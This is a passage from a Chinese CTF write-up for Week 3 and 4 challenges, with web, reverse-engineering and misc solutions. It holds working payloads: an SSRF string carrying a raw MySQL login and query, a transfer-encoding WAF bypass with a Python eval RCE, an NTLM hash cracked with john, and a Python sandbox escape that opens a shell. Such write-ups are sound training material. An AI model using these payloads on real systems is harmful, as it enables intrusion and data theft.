<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use ctf_db;select * from flags;</span><br><span class="line"></span><br><span class="line">X-VERIFY-CODE-URL: ftp://127.0.0.1:3306/%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%20%00%00%00%03%75%73%65%20%63%74%66%5f%64%62%3b%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%66%6c%61%67%73%3b%01%00%00%00%01</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week3&week4_WP/image-20251029171712941.png" alt="image-20251029171712941"></p>
<h2 id="Week4-waf-waf"><a href="#Week4-waf-waf" class="headerlink" title="[Week4] waf?waf!"></a>[Week4] waf?waf!</h2><p>代码审计发现，中间套了一层转发，转发中间存在waf</p>
<p>接着审计到这里</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week3&week4_WP/image-20251029224715682.png" alt="image-20251029224715682"></p>
<p>可以知道只要存在<code>transfer-encoding</code>这个http头，中间转发时都会body的数据当初<code>transfer-encoding:chunked </code>处理，而<code>flask</code>只有<code>transfer-encoding:chunked</code>时才会做<code>chunked</code>的解析，其他情况都会当初普通的POST处理</p>
<p>因此设置<code>transfer-encoding:1</code>，body部分传正常的POST数据即可，记在数据包尾部多加几行换行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /calc HTTP/1.1</span><br><span class="line">Host: </span><br><span class="line">Content-Length: 51</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://challenge.ilovectf.cn:30277</span><br><span class="line">Referer: http://challenge.ilovectf.cn:30277/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">transfer-encoding:1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">calc=__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week3&week4_WP/image-20251029224940702.png" alt="image-20251029224940702"></p>
<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="Week3-wtf"><a href="#Week3-wtf" class="headerlink" title="[Week3] wtf"></a>[Week3] wtf</h2><p>分析<code>/src.js</code>可以知道是先将flag头异或后，接着tea加密，再异或</p>
<p>分析<code>/div.js</code>可以得到真实的key</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week3&week4_WP/image-20251022004847087.png" alt="image-20251022004847087"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">K0meji_K0ishi</span><br></pre></td></tr></table></figure>

<p>最后写脚本逆向</p>
<p>先求出tea的密文</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">95</span>, <span class="number">113</span>, <span class="number">237</span>, <span class="number">87</span>, <span class="number">185</span>, <span class="number">220</span>, <span class="number">29</span>, <span class="number">87</span>, <span class="number">99</span>, <span class="number">106</span>, <span class="number">173</span>, <span class="number">234</span>, <span class="number">172</span>, <span class="number">121</span>, <span class="number">248</span>, <span class="number">253</span>, <span class="number">177</span>, <span class="number">15</span>, <span class="number">158</span>, <span class="number">111</span>, <span class="number">58</span>, <span class="number">89</span>, <span class="number">184</span>, <span class="number">109</span>]</span><br><span class="line">__key = <span class="string">b&quot;K0meji_K0ishi&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    a[i] = a[i]^__key[i%<span class="built_in">len</span>(__key)]</span><br><span class="line"></span><br><span class="line">tmp = <span class="built_in">bytes</span>(a).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(tmp),<span class="number">8</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;0x&#x27;</span>+tmp[i:i+<span class="number">8</span>],end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解密tea</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encrypt</span> <span class="params">(<span class="type">uint32_t</span> *v,<span class="type">uint32_t</span> *k )</span></span>&#123;</span><br><span class="line">	<span class="type">uint32_t</span> v0=v[<span class="number">0</span>],v1=v[<span class="number">1</span>],sum=<span class="number">0</span>,i;</span><br><span class="line">	<span class="type">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;</span><br><span class="line">	<span class="type">uint32_t</span> k0=k[<span class="number">0</span>],k1=k[<span class="number">1</span>],k2=k[<span class="number">2</span>],k3=k[<span class="number">3</span>];</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line">		sum+=delta;</span><br><span class="line">		v0+=((v1&lt;&lt;<span class="number">4</span>)+k0)^(v1+sum)^((v1&gt;&gt;<span class="number">5</span>)+k1);</span><br><span class="line">		v1+=((v0&lt;&lt;<span class="number">4</span>)+k2)^(v0+sum)^((v0&gt;&gt;<span class="number">5</span>)+k3);</span><br><span class="line">	&#125; </span><br><span class="line">	v[<span class="number">0</span>]=v0;v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span> <span class="params">(<span class="type">uint32_t</span> *v,<span class="type">uint32_t</span> *k)</span></span>&#123;</span><br><span class="line">	<span class="type">uint32_t</span> v0=v[<span class="number">0</span>],v1=v[<span class="number">1</span>],sum=<span class="number">0x9e3779b9</span>*<span class="number">32</span>,i;</span><br><span class="line">	<span class="type">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;</span><br><span class="line">	<span class="type">uint32_t</span> k0=k[<span class="number">0</span>],k1=k[<span class="number">1</span>],k2=k[<span class="number">2</span>],k3=k[<span class="number">3</span>];</span><br><span class="line">	<span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line">		v1-=((v0&lt;&lt;<span class="number">4</span>)+k2)^(v0+sum)^((v0&gt;&gt;<span class="number">5</span>)+k3);</span><br><span class="line">		v0-=((v1&lt;&lt;<span class="number">4</span>)+k0)^(v1+sum)^((v1&gt;&gt;<span class="number">5</span>)+k1);</span><br><span class="line">		sum-=delta;</span><br><span class="line">	&#125; </span><br><span class="line">	v[<span class="number">0</span>]=v0;v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">uint32_t</span> v[<span class="number">6</span>]=&#123;<span class="number">0x14418032</span>,<span class="number">0xd3b5421c</span>,<span class="number">0x5303de82</span>,<span class="number">0xc532c890</span>,<span class="number">0xd465f730</span>,<span class="number">0x7169d11e</span>&#125;; </span><br><span class="line">	<span class="type">uint32_t</span> k[<span class="number">4</span>]=&#123;<span class="number">1261464933</span>, <span class="number">1785290571</span>, <span class="number">812217192</span>, <span class="number">1766535277</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i+=<span class="number">2</span>)&#123;</span><br><span class="line">		<span class="built_in">decrypt</span>(&amp;v[i], k);</span><br><span class="line">		<span class="keyword">if</span>(i==<span class="number">0</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%c%c%c%c&quot;</span>,((v[i] &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>^<span class="number">0x12</span>),(v[i] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>^<span class="number">0x34</span>,(v[i] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>^<span class="number">0x56</span>,v[i] &amp; <span class="number">0xFF</span>^<span class="number">0x78</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%c%c%c%c&quot;</span>,(v[i] &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>,(v[i] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>,(v[i] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>,v[i] &amp; <span class="number">0xFF</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c%c%c%c&quot;</span>,(v[i+<span class="number">1</span>] &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>,(v[i+<span class="number">1</span>] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>,(v[i+<span class="number">1</span>] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>,v[i+<span class="number">1</span>] &amp; <span class="number">0xFF</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// flag&#123;j$_l$_v3Ry_dyN4mIc&#125;</span></span><br></pre></td></tr></table></figure>



<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Week3-文化木的侦探委托-三"><a href="#Week3-文化木的侦探委托-三" class="headerlink" title="[Week3] 文化木的侦探委托(三)"></a>[Week3] 文化木的侦探委托(三)</h2><p>用winrar修复压缩包，解压得到flag</p>
<h2 id="Week3-俱乐部之旅-3-与时间对话"><a href="#Week3-俱乐部之旅-3-与时间对话" class="headerlink" title="[Week3] 俱乐部之旅(3) - 与时间对话"></a>[Week3] 俱乐部之旅(3) - 与时间对话</h2><p>零宽得到密码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week3&week4_WP/image-20251022115334332.png" alt="image-20251022115334332"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">P@ssW0rd 1s th3 md5 v4lue 0f th3 wOrd &quot;t1me&quot; </span><br><span class="line">eeb7ac660269f45046a0e8abaa51dfec</span><br></pre></td></tr></table></figure>

<p>解压后是个<code>.git</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git log</span><br><span class="line"></span><br><span class="line">$ git log</span><br><span class="line">commit 00e18ca422b468efd066e16499fc963e2fe994e1 (HEAD -&gt; main)</span><br><span class="line">Author: 2hi5hu &lt;1307370271@qq.com&gt;</span><br><span class="line">Date:   Thu Oct 9 19:28:44 2025 +0800</span><br><span class="line"></span><br><span class="line">    Hope you will have fun here</span><br><span class="line"></span><br><span class="line">commit 8e2ab75e902de7c6f86d42bd4d4ec40b1c863a88</span><br><span class="line">Author: 2hi5hu &lt;1307370271@qq.com&gt;</span><br><span class="line">Date:   Thu Oct 9 19:28:27 2025 +0800</span><br><span class="line"></span><br><span class="line">    Welcome to C5im Club</span><br><span class="line"></span><br><span class="line">commit 43ff97c7a8f3aed70a29e9a1418e105ca5eb569b</span><br><span class="line">Author: 2hi5hu &lt;1307370271@qq.com&gt;</span><br><span class="line">Date:   Thu Oct 9 19:26:41 2025 +0800</span><br><span class="line"></span><br><span class="line">    Lost my treasure</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>提取出<code>dora</code>，发现文件头是<code>GIF</code>，补全<code>GIF</code>头</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week3&week4_WP/image-20251024214345286.png" alt="image-20251024214345286"></p>
<p>根据题目描述的时间，猜测是GIF的帧间隔隐写提取出帧间隔时间</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week3&week4_WP/image-20251024214428303.png" alt="image-20251024214428303"></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="string">&#x27;140&#x27;</span>, <span class="string">&#x27;140&#x27;</span>, <span class="string">&#x27;140&#x27;</span>, <span class="string">&#x27;140&#x27;</span>, <span class="string">&#x27;140&#x27;</span>, <span class="string">&#x27;140&#x27;</span>, <span class="string">&#x27;140&#x27;</span>, <span class="string">&#x27;140&#x27;</span>, <span class="string">&#x27;140&#x27;</span>, <span class="string">&#x27;140&#x27;</span>, <span class="string">&#x27;140&#x27;</span>, <span class="string">&#x27;140&#x27;</span>, <span class="string">&#x27;140&#x27;</span>, <span class="string">&#x27;140&#x27;</span>, <span class="string">&#x27;140&#x27;</span>, <span class="string">&#x27;140&#x27;</span>, <span class="string">&#x27;140&#x27;</span>, <span class="string">&#x27;140&#x27;</span>, <span class="string">&#x27;140&#x27;</span>, <span class="string">&#x27;140&#x27;</span>, <span class="string">&#x27;140&#x27;</span>, <span class="string">&#x27;140&#x27;</span>, <span class="string">&#x27;140&#x27;</span>, <span class="string">&#x27;140&#x27;</span>, <span class="string">&#x27;140&#x27;</span>, <span class="string">&#x27;140&#x27;</span>, <span class="string">&#x27;1250&#x27;</span>, <span class="string">&#x27;1010&#x27;</span>, <span class="string">&#x27;1090&#x27;</span>, <span class="string">&#x27;1050&#x27;</span>, <span class="string">&#x27;550&#x27;</span>, <span class="string">&#x27;950&#x27;</span>, <span class="string">&#x27;1020&#x27;</span>, <span class="string">&#x27;480&#x27;</span>, <span class="string">&#x27;950&#x27;</span>, <span class="string">&#x27;530&#x27;</span>, <span class="string">&#x27;1140&#x27;</span>, <span class="string">&#x27;1010&#x27;</span>, <span class="string">&#x27;1120&#x27;</span>, <span class="string">&#x27;1150&#x27;</span>, <span class="string">&#x27;490&#x27;</span>, <span class="string">&#x27;1040&#x27;</span>, <span class="string">&#x27;1190&#x27;</span>, <span class="string">&#x27;950&#x27;</span>, <span class="string">&#x27;1010&#x27;</span>, <span class="string">&#x27;1040&#x27;</span>, <span class="string">&#x27;550&#x27;</span>, <span class="string">&#x27;950&#x27;</span>, <span class="string">&#x27;1030&#x27;</span>, <span class="string">&#x27;1100&#x27;</span>, <span class="string">&#x27;490&#x27;</span>, <span class="string">&#x27;1000&#x27;</span>, <span class="string">&#x27;970&#x27;</span>, <span class="string">&#x27;510&#x27;</span>, <span class="string">&#x27;820&#x27;</span>, <span class="string">&#x27;1230&#x27;</span>, <span class="string">&#x27;1030&#x27;</span>, <span class="string">&#x27;970&#x27;</span>, <span class="string">&#x27;1080&#x27;</span>, <span class="string">&#x27;1020&#x27;</span>]</span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    res += [<span class="built_in">int</span>(i)//<span class="number">10</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(res)[::-<span class="number">1</span>])</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;R3ad1ng_7he_wh1sper5_0f_7ime&#125;\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e&#x27;</span></span><br></pre></td></tr></table></figure>









<h2 id="Week3-布豪有黑客-三"><a href="#Week3-布豪有黑客-三" class="headerlink" title="[Week3] 布豪有黑客(三)"></a>[Week3] 布豪有黑客(三)</h2><p>提取NTLM信息</p>
<p><a target="_blank" rel="noopener" href="https://github.com/mlgualtieri/NTLMRawUnHide">https://github.com/mlgualtieri/NTLMRawUnHide</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rockyou::C3NGH--DESKTOP:91e15fed933eff0c:e20402e8a924e2de7c1e3fd3f949bc38:01010000000000001df551630839dc011473b30c1fc1c20f000000000200160046004c00410047002d005300450052005600450052000100160046004c00410047002d005300450052005600450052000400160046004c00410047002d005300650072007600650072000300160046004c00410047002d00530065007200760065007200070008001df551630839dc0106000400020000000800300030000000000000000100000000200000a6cd8042becda35cc7967ee26857127fac305123020cefe31fcefbfd7ece32d50a001000000000000000000000000000000000000900200063006900660073002f0046004c00410047002d00530045005200560045005200000000000000000000000000</span><br></pre></td></tr></table></figure>

<p>根据提示，使用<code>rockyou</code>字典进行爆破</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john --wordlist=./rockyou.txt hash.txt</span><br></pre></td></tr></table></figure>

<p>得到密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">poohkitty13</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week3&week4_WP/image-20251024202458857.png" alt="image-20251024202458857"></p>
<p>解密流量</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week3&week4_WP/image-20251024202631577.png" alt="image-20251024202631577"></p>
<p>找到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week3&week4_WP/image-20251024202817873.png" alt="image-20251024202817873"></p>
<h2 id="Week3-《关于我穿越到CTF的异世界这档事-Q》"><a href="#Week3-《关于我穿越到CTF的异世界这档事-Q》" class="headerlink" title="[Week3] 《关于我穿越到CTF的异世界这档事:Q》"></a>[Week3] 《关于我穿越到CTF的异世界这档事:Q》</h2><p>flag1</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week3&week4_WP/image-20251024203315884.png" alt="image-20251024203315884"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ZmxhZ3tZMHV</span><br></pre></td></tr></table></figure>

<p>接着使用strings大法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings little\ hunter.exe| grep flag1</span><br><span class="line">flag1:ZmxhZ3tZMHV</span><br><span class="line"></span><br><span class="line">strings little\ hunter.exe| grep flag3</span><br><span class="line">flag3:JlQDExeV9</span><br><span class="line"></span><br><span class="line">strings little\ hunter.exe| grep flag5</span><br><span class="line">flag5:fR0FNRV</span><br><span class="line"></span><br><span class="line">strings little\ hunter.exe| grep flag6</span><br><span class="line">flag6:IhISF9</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>通过关键字和程序图标可以知道这是<code>godot</code>引擎，接着使用工具解压</p>
<p>解压后全局搜flag</p>
<p>在<code>flag1</code>下边可以发现散装的flag2和flag4</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week3&week4_WP/image-20251024221149155.png" alt="image-20251024221149155"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag2:fQHJlX1</span><br><span class="line">flag4:BX0cwMGR</span><br></pre></td></tr></table></figure>

<p>完整flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag1:ZmxhZ3tZMHV</span><br><span class="line">flag3:JlQDExeV9</span><br><span class="line">flag5:fR0FNRV</span><br><span class="line">flag6:IhISF9</span><br><span class="line">flag2:fQHJlX1</span><br><span class="line">flag4:BX0cwMGR</span><br><span class="line"></span><br><span class="line">ZmxhZ3tZMHVfQHJlX1JlQDExeV9BX0cwMGRfR0FNRVIhISF9</span><br><span class="line">flag&#123;Y0u_@re_Re@11y_A_G00d_GAMER!!!&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Week4-《关于我穿越到CTF的异世界这档事-终》"><a href="#Week4-《关于我穿越到CTF的异世界这档事-终》" class="headerlink" title="[Week4] 《关于我穿越到CTF的异世界这档事:终》"></a>[Week4] 《关于我穿越到CTF的异世界这档事:终》</h2><p>用下面这条可以打通</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[].__reduce_ex__(3)[0].__globals__[&quot;__builtins__&quot;][&quot;__import__&quot;](&quot;os&quot;).system(&quot;sh&quot;)</span><br></pre></td></tr></table></figure>

<p>接着就是进行变形</p>
<p>测试发现，<code>[].__reduce_ex__(2)[0].__globals__</code>也能逃逸到全局</p>
<p>接着就想办法获取到数字<code>2</code></p>
<p>使用<code>0==0</code>得到<code>1</code>，接着<code>1&lt;&lt;1</code>得到<code>2</code>，用海象表达式可以给变量赋值</p>
<p>接着获取到<code>exec</code>后，再套个<code>input</code>能够获得再次执行代码的机会，这时候没有任何限制直接RCE</p>
<p>中间的长度检测通过插入引号，让正则多分割成几份符合长度条件的字符串</p>
<p>最终payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[aa:=00==00,aa:=aa&lt;&lt;aa,aa:=[].__reduce_ex__(aa)[00].__globals__[&#x27;__b&#x27;&#x27;ui&#x27;&#x27;ltins__&#x27;],aa[&#x27;ex&#x27;&#x27;ec&#x27;](aa[&#x27;input&#x27;](),aa)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read())</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week3&week4_WP/image-20251028011634580.png" alt="image-20251028011634580"></p>
<h2 id="Week4-俱乐部之旅-4-彩蛋"><a href="#Week4-俱乐部之旅-4-彩蛋" class="headerlink" title="[Week4] 俱乐部之旅(4) - 彩蛋"></a>[Week4] 俱乐部之旅(4) - 彩蛋</h2><p>先从<code>mvk</code>中提取出字幕，发现这里是zip头倒过来的样子</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week3&week4_WP/image-20251029011950581.png" alt="image-20251029011950581"></p>
<p>接着提取出压缩包</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">datas = <span class="built_in">open</span>(<span class="string">&#x27;我把彩蛋弄丢了_track3_[und].srt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read().splitlines()</span><br><span class="line"></span><br><span class="line">cnt = <span class="number">1</span></span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(cnt).encode())</span><br><span class="line"><span class="built_in">print</span>(datas[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(datas)):</span><br><span class="line">    <span class="comment"># print(datas[i])</span></span><br><span class="line">    <span class="comment"># print(str(cnt).encode())</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(cnt).encode() == datas[i]:</span><br><span class="line">        <span class="comment"># print(i)</span></span><br><span class="line">        flag += datas[i+<span class="number">2</span>].strip()</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">flag = flag[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;res.zip&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(<span class="built_in">bytes</span>.fromhex(flag.decode()))</span><br></pre></td></tr></table></figure>

<p>再次分析发现这是一个模型文件，读取里面的数据，发现了<code>X0R</code>和<code>Easter egg</code>异或后就是flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line">file = <span class="string">&#x27;res.zip&#x27;</span></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(file,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">data = torch.load(f,map_location=<span class="string">&#x27;cpu&#x27;</span>)<span class="comment">#可使用cpu或gpu</span></span><br><span class="line"><span class="comment"># print(data)</span></span><br><span class="line"></span><br><span class="line">key = data[<span class="string">&#x27;X0R&#x27;</span>]</span><br><span class="line">enc = data[<span class="string">&#x27;Easter egg&#x27;</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    tmp = key[i]^enc[i]</span><br><span class="line">    flag += <span class="built_in">chr</span>(tmp)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag&#123;Th@nk_U_4_p1ayin9_My_Gam3&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="Week4-文化木的侦探委托-四"><a href="#Week4-文化木的侦探委托-四" class="headerlink" title="[Week4] 文化木的侦探委托(四)"></a>[Week4] 文化木的侦探委托(四)</h2><p>根据<code>what&#39;s_this？</code>的内容，先写脚本还原出<code>password.wav</code></p>
<p>拷打AI得到脚本（</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取二进制浮点文件（每个元素为32位float）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_float_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> np.fromfile(filename, dtype=np.float32)</span><br><span class="line"></span><br><span class="line">mag = read_float_file(<span class="string">&quot;mag&quot;</span>)       <span class="comment"># 幅度数组</span></span><br><span class="line">phase = read_float_file(<span class="string">&quot;phase&quot;</span>)   <span class="comment"># 相位数组（弧度）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 恢复共轭复数信号（complex_conj = mag * e^(j*phase)）</span></span><br><span class="line">complex_conj = mag * np.exp(<span class="number">1j</span> * phase)</span><br><span class="line">complex_signal = np.conj(complex_conj)  <span class="comment"># 原始复数信号</span></span><br><span class="line">virtual_source_1 = np.real(complex_signal)  <span class="comment"># 提取实部，即虚拟源信号</span></span><br><span class="line"></span><br><span class="line">pw_file = read_float_file(<span class="string">&quot;password...？&quot;</span>)  <span class="comment"># 读取叠加后的缩放信号</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 确保信号长度一致（若不一致，取较短长度截断）</span></span><br><span class="line">min_len = <span class="built_in">min</span>(<span class="built_in">len</span>(pw_file), <span class="built_in">len</span>(virtual_source_1))</span><br><span class="line">pw_wav_signal = (pw_file[:min_len] / <span class="number">2.5</span>) - virtual_source_1[:min_len]</span><br><span class="line"><span class="keyword">import</span> wave</span><br><span class="line"></span><br><span class="line"><span class="comment"># 音频参数（与原始文件一致）</span></span><br><span class="line">sample_rate = <span class="number">44100</span>  <span class="comment"># 采样率</span></span><br><span class="line">n_channels = <span class="number">1</span>       <span class="comment"># 单通道</span></span><br><span class="line">sample_width = <span class="number">2</span>     <span class="comment"># 16位PCM（2字节）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将浮点信号（范围通常为[-1, 1]）转换为16位整数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">float_to_pcm</span>(<span class="params">signal</span>):</span><br><span class="line">    <span class="comment"># 限制范围到[-1, 1]，避免溢出</span></span><br><span class="line">    signal_clamped = 